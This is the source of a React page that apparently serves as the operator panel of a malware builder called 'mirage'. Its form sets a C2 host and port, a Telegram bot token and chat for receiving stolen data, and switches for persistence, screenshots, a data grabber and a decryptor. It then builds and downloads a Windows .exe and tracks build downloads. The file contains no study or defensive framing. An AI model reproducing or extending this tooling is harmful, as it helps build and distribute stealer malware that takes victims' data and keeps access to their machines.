import { useState } from 'react'
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query'
import { api } from '@/lib/api'
import { t } from '@/lib/i18n'
import { Button } from '@/components/ui/button'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table'
import { Skeleton } from '@/components/ui/skeleton'
import { Hammer, Download, Loader2 } from 'lucide-react'
import type { BuildConfig, BuildRecord, BuildResponse } from '@/types'

export default function BuildPage() {
  const queryClient = useQueryClient()
  const [config, setConfig] = useState<BuildConfig>({
    c2_host: '127.0.0.1', c2_port: 8443,
    telegram_token: '', telegram_chat_id: '',
    enable_persistence: false, enable_screenshot: true,
    enable_grabber: true, include_decryptor: true,
    build_tag: '',
  })

  const buildsQuery = useQuery({
    queryKey: ['builds'],
    queryFn: () => api.get<BuildRecord[]>('/api/build'),
  })

  const buildMutation = useMutation({
    mutationFn: () => api.post<BuildResponse>('/api/build', config),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['builds'] })
    },
  })

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    buildMutation.mutate()
  }

  const handleDownload = async (buildId: string) => {
    try {
      const token = localStorage.getItem('token')
      const res = await fetch(`/api/build/${buildId}/download`, {
        headers: token ? { Authorization: `Bearer ${token}` } : {},
      })
      if (!res.ok) throw new Error('download failed')
      const blob = await res.blob()
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url
      a.download = `mirage_${buildId.slice(0, 8)}.exe`
      a.click()
      URL.revokeObjectURL(url)
    } catch (err) {
      console.error('Build download failed:', err)
    }
  }

  return (
    <div className="space-y-6">
      <h1 className="text-2xl font-semibold tracking-tight">{t('build.title')}</h1>

      <Card>
        <CardHeader><CardTitle className="text-sm font-medium">{t('build.config')}</CardTitle></CardHeader>
        <CardContent>
          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="grid gap-4 md:grid-cols-2">
              <div className="space-y-2">
                <Label htmlFor="c2_host">{t('build.c2_host')}</Label>
                <Input id="c2_host" value={config.c2_host} onChange={e => setConfig(c => ({ ...c, c2_host: e.target.value }))} required />
              </div>
              <div className="space-y-2">
                <Label htmlFor="c2_port">{t('build.c2_port')}</Label>
                <Input id="c2_port" type="number" min={1} max={65535} value={config.c2_port} onChange={e => setConfig(c => ({ ...c, c2_port: parseInt(e.target.value) || 8443 }))} />
              </div>
              <div className="space-y-2">
                <Label htmlFor="tg_token">{t('build.tg_token')}</Label>
                <Input id="tg_token" value={config.telegram_token} onChange={e => setConfig(c => ({ ...c, telegram_token: e.target.value }))} />
              </div>
              <div className="space-y-2">
                <Label htmlFor="tg_chat">{t('build.tg_chat')}</Label>
                <Input id="tg_chat" value={config.telegram_chat_id} onChange={e => setConfig(c => ({ ...c, telegram_chat_id: e.target.value }))} />
              </div>
              <div className="space-y-2">
                <Label htmlFor="build_tag">{t('build.tag')}</Label>
                <Input id="build_tag" placeholder="my_first_build" value={config.build_tag} onChange={e => setConfig(c => ({ ...c, build_tag: e.target.value }))} />
              </div>
            </div>

            <div className="flex flex-wrap gap-4">
              <label className="flex items-center gap-2 text-sm">
                <input type="checkbox" checked={config.enable_screenshot} onChange={e => setConfig(c => ({ ...c, enable_screenshot: e.target.checked }))} />
                {t('build.screenshot')}
              </label>
              <label className="flex items-center gap-2 text-sm">
                <input type="checkbox" checked={config.enable_persistence} onChange={e => setConfig(c => ({ ...c, enable_persistence: e.target.checked }))} />
                {t('build.persistence')}
              </label>
              <label className="flex items-center gap-2 text-sm">
                <input type="checkbox" checked={config.enable_grabber} onChange={e => setConfig(c => ({ ...c, enable_grabber: e.target.checked }))} />
                {t('build.grabber')}
              </label>
              <label className="flex items-center gap-2 text-sm">
                <input type="checkbox" checked={config.include_decryptor} onChange={e => setConfig(c => ({ ...c, include_decryptor: e.target.checked }))} />
                {t('build.decryptor')}
              </label>
            </div>

            <Button type="submit" disabled={buildMutation.isPending || !config.c2_host.trim()}>
              {buildMutation.isPending ? <Loader2 className="h-4 w-4 animate-spin mr-2" /> : <Hammer className="h-4 w-4 mr-2" />}
              {buildMutation.isPending ? t('build.building') : t('build.build')}
            </Button>

            {buildMutation.data && (
              <div className="rounded-md bg-success/10 p-3 text-sm text-success space-y-1">
                <p>✅ {t('build.success')}</p>
                <p className="text-xs font-mono">Size: {(buildMutation.data.file_size / 1024).toFixed(1)} KB</p>
                <p className="text-xs font-mono">SHA256: {buildMutation.data.sha256}</p>
              </div>
            )}
            {buildMutation.error && (
              <div className="rounded-md bg-destructive/10 p-3 text-sm text-destructive">
                Build failed: {(buildMutation.error as { message?: string })?.message || 'unknown error'}
              </div>
            )}
          </form>
        </CardContent>
      </Card>

      <Card>
        <CardHeader><CardTitle className="text-sm font-medium">{t('build.history')}</CardTitle></CardHeader>
        <CardContent>
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>Tag</TableHead>
                <TableHead>Size</TableHead>
                <TableHead>SHA256</TableHead>
                <TableHead>Created</TableHead>
                <TableHead>Downloads</TableHead>
                <TableHead />
              </TableRow>
            </TableHeader>
            <TableBody>
              {buildsQuery.isLoading && Array.from({length: 3}).map((_, i) => (
                <TableRow key={i}><TableCell colSpan={6}><Skeleton className="h-8 w-full" /></TableCell></TableRow>
              ))}
              {buildsQuery.data?.map(b => (
                <TableRow key={b.id}>
                  <TableCell className="font-mono text-xs">{b.build_tag || '—'}</TableCell>
                  <TableCell className="tabular-nums">{(b.file_size / 1024).toFixed(0)} KB</TableCell>
                  <TableCell className="font-mono text-xs text-muted-foreground">{b.sha256?.slice(0, 12)}..</TableCell>
                  <TableCell className="text-xs text-muted-foreground">{b.created_at}</TableCell>
                  <TableCell className="tabular-nums">{b.download_count}</TableCell>
                  <TableCell>
                    <Button variant="ghost" size="sm" onClick={() => handleDownload(b.id)}><Download className="h-4 w-4" /></Button>
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </CardContent>
      </Card>
    </div>
  )
}
